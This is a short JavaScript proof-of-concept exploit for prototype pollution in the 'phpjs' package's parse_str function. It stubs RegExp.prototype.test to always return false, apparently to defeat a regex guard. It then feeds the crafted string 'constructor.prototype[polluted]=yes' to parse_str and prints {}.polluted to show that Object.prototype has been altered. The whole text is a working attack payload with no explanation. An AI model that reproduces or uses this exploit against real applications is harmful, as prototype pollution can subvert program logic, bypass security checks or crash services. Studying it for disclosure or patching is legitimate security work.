RegExp.prototype.test = () => false;
console.log({}.polluted);
const p = require('phpjs');
p.parse_str('constructor.prototype[polluted]=yes', {});
console.log({}.polluted);